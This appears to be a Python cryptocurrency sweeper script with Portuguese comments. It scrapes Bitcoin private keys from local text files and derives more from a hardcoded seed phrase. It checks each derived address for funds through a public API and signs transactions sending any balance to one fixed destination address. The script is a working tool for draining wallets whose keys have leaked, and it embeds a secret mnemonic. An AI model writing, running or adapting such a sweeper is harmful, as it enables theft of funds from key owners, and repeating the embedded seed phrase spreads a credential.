import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def extract_keys_from_text(filename):
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        return re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
    except: return []

def scan_full_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys_wif = []

    # 1. Extração de múltiplos arquivos
    all_keys_wif.extend(extract_keys_from_text('privatekeys.txt'))
    all_keys_wif.extend(extract_keys_from_text('priv.key.rtf'))
    
    # 2. Tentativa de Mnemônica com correção de erro
    try:
        mnemonic = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        # Tentamos criar a HDKey ignorando validação estrita se possível
        master = HDKey.from_passphrase(mnemonic, network='bitcoin', witness_type='p2wpkh')
        for i in range(100):
            for path in [f"m/44'/0'/0'/0/{i}", f"m/49'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                all_keys_wif.append(master.subkey_for_path(path).wif())
    except:
        print("Aviso: Mnemônica inválida ignorada. Focando nas chaves WIF extraídas.")

    all_keys_wif = list(dict.fromkeys(all_keys_wif))
    print(f"Iniciando varredura de {len(all_keys_wif)} chaves em múltiplos formatos...")

    # 3. Varredura Profunda
    for wif in all_keys_wif:
        try:
            k = Key(wif, network='bitcoin')
            # Testamos os 3 formatos de endereço para cada chave privada
            for t_type in ['p2pkh', 'p2wpkh', 'p2sh-p2wpkh']:
                addr = k.address(witness_type=t_type)
                
                try:
                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                    if r.status_code == 200:
                        utxos = r.json()
                        if utxos:
                            print(f"!!! SALDO ENCONTRADO: {addr} !!!")
                            utxo = max(utxos, key=lambda x: x['value'])
                            fee = 40000 # Taxa de prioridade máxima
                            amount = utxo['value'] - fee
                            
                            if amount > 1000:
                                tx = Transaction(network='bitcoin')
                                tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                                tx.add_output(value=amount, address=dest_address)
                                tx.sign([wif])
                                print(f"HEX_GEN:{tx.raw_hex()}")
                except: continue
            time.sleep(0.05)
        except: continue

if __name__ == "__main__":
    scan_full_protocol()
